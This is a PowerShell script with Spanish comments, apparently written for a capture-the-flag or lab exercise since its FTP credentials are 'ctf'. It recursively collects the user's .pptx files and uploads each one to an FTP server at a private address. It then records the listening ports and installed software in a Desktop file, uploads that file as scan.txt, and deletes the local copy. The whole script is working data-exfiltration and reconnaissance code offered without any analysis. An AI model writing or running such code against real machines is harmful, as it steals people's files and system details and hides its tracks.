# Parámetros FTP
$ftpServer = "192.168.231.152"
$ftpUsername = "ctf"
$ftpPassword = "ctf"



# Ruta del perfil actual del usuario
$perfilUsuario = [System.IO.Path]::Combine($env:USERPROFILE)

# Patrón de búsqueda para archivos .ppt
$patronBusqueda = "*.pptx"

# Buscar archivos en la ruta del perfil del usuario con la extensión .ppt
$archivosPPT = Get-ChildItem -Path $perfilUsuario -Filter $patronBusqueda -Recurse

# Mostrar la lista de archivos encontrados
if ($archivosPPT.Count -gt 0) {
    Write-Host "Archivos .ppt encontrados en $perfilUsuario"
    foreach ($archivo in $archivosPPT) {
        Write-Host $archivo.FullName
	$archivoRemoto = "/" + $archivo.Name
	$ftp = [System.Net.WebRequest]::Create("ftp://$ftpServer$archivoRemoto")
	$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
	$ftp.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
	$contenidoArchivo = Get-Content -Path $archivo.FullName -Raw
	$bytesArchivo = [System.Text.Encoding]::UTF8.GetBytes($contenidoArchivo)

	$stream = $ftp.GetRequestStream()
	$stream.Write($bytesArchivo, 0, $bytesArchivo.Length)
	$stream.Close()
	
    }
} else {
    Write-Host "No se encontraron archivos .ppt en $perfilUsuario."
}

$resultsDir =$perfilUsuario+"\Desktop\"
New-Item -ItemType Directory -Force -Path $resultsDir | Out-Null

# Obtener la lista de puertos abiertos
Write-Output "=== Puertos abiertos ===" > $resultsDir\prueba.txt
Get-NetTCPConnection | Where-Object { $_.State -eq "Listen" } >> $resultsDir\prueba.txt

# Obtener la lista de aplicaciones instaladas
Write-Output "`n=== Aplicaciones instaladas ===" >> $resultsDir\prueba.txt
Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version >> $resultsDir\prueba.txt

$tiempoEspera = 2

# Esperar el tiempo especificado
Start-Sleep -Seconds $tiempoEspera

# Ruta local del archivo a enviar
$archivoLocal = $perfilUsuario+"\Desktop\prueba.txt"
$archivoRemoto = "/scan.txt"

$ftp = [System.Net.WebRequest]::Create("ftp://$ftpServer$archivoRemoto")
$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$ftp.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)

# Leer el contenido del archivo local
$contenidoArchivo = Get-Content -Path $archivoLocal -Raw

# Convertir el contenido a bytes
$bytesArchivo = [System.Text.Encoding]::UTF8.GetBytes($contenidoArchivo)

# Subir el archivo al servidor FTP
$stream = $ftp.GetRequestStream()
$stream.Write($bytesArchivo, 0, $bytesArchivo.Length)
$stream.Close()

$tiempoEspera = 2

# Esperar el tiempo especificado
Start-Sleep -Seconds $tiempoEspera
Remove-Item  $perfilUsuario+"\Desktop\prueba.txt"

